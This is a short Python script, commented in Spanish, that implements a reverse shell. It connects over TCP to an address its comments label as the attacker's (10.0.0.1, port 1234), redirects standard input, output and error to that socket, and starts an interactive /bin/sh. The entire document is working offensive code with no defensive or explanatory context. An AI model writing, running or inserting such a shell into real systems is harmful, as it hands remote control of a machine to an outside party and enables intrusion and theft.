import socket
import subprocess
import os

# Configuración de la conexión
IP = "10.0.0.1"   # Dirección IP del atacante
PUERTO = 1234     # Puerto en el que el atacante está escuchando

# Crear un socket TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Conectarse al atacante
s.connect((IP, PUERTO))

# Redirigir la entrada, salida y errores estándar al socket
os.dup2(s.fileno(), 0)  # Redirige la entrada estándar (stdin) al socket
os.dup2(s.fileno(), 1)  # Redirige la salida estándar (stdout) al socket
os.dup2(s.fileno(), 2)  # Redirige los errores estándar (stderr) al socket

# Iniciar una shell interactiva
p = subprocess.call(["/bin/sh", "-i"])

